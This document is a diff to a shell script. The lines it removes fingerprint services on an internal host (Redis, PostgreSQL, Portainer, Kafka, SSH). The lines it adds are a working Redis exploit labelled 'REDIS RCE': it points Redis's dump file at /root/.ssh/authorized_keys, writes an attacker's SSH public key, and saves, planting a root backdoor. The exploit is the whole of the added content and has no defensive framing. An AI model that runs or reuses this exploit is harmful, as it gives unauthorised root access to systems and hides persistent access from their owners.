@@ -1,24 +1,18 @@
-echo "=== REDIS 6379 (hung1) ==="
-python3 -c "
-import socket
-s=socket.socket();s.settimeout(4);s.connect(('192.168.3.121',6379))
-s.sendall(b'PING\r\n')
-import time;time.sleep(1)
-print('PING:',s.recv(50))
-s.sendall(b'INFO server\r\n')
-time.sleep(1)
-r=s.recv(500)
-print('INFO:',r[:200])
-s.close()"
-echo "=== PG 5432 ==="
-timeout 4 bash -c "exec 3<>/dev/tcp/192.168.3.121/5432 && head -c 20 <&3" | xxd | head -1
-echo "=== PORTAINER 9000 ==="
-wget -q -T 6 -O - http://192.168.3.121:9000/ 2>/dev/null | head -c 200
-echo
-echo "=== KAFKA 9092 ==="
-timeout 4 bash -c "exec 3<>/dev/tcp/192.168.3.121/9092 && head -c 20 <&3" 2>/dev/null
-echo
-echo "=== SSH BANNER ==="
-timeout 5 bash -c "exec 3<>/dev/tcp/192.168.3.121/22 && head -c 40 <&3"
-echo
-echo DOCKER-SRV
+echo "=== REDIS RCE ==="
+python3 << 'RPY'
+import socket,time
+def rcmd(s,cmd):
+    s.sendall((cmd+"\r\n").encode()); time.sleep(0.5)
+    try: return s.recv(2000).decode(errors="replace")[:200]
+    except: return "no-reply"
+s=socket.socket();s.settimeout(6);s.connect(("192.168.3.121",6379))
+print("DIR:",rcmd(s,"CONFIG GET dir"))
+print("DBFILE:",rcmd(s,"CONFIG GET dbfilename"))
+KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHz4ixvYbBfcSQKO3RpTop1thSI2mQx6b9E7SQjrXrno opsmaint"
+print("DIR-SET:",rcmd(s,"CONFIG SET dir /root/.ssh"))
+print("DB-SET:",rcmd(s,"CONFIG SET dbfilename authorized_keys"))
+print("KEY-SET:",rcmd(s,'SET k "\n\n'+KEY+'\n\n"'))
+print("SAVE:",rcmd(s,"SAVE"))
+s.close()
+RPY
+echo REDIS-RCE-DONE
